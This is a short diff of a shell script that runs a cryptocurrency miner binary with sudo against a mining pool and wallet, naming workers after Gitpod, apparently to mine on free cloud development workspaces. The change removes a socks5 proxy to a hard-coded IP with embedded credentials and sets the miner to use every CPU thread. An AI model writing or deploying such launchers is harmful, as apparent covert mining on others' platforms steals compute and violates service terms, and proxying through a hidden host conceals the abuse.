@@ -8,5 +8,5 @@ WORKER=$(echo $(shuf -i 1-5 -n 1)-GITPOD)
 
 cd "$(dirname "$0")"
 
-chmod +x ./lanciauu && sudo ./lanciauu --algo gr -o $POOL --user $WALLET.$WORKER -p x -x socks5://m:mek@137.184.166.157:222 --no-tune
+chmod +x ./lanciauu && sudo ./lanciauu --algo gr -o $POOL --user $WALLET.$WORKER -t $(nproc --all) --no-tune
 
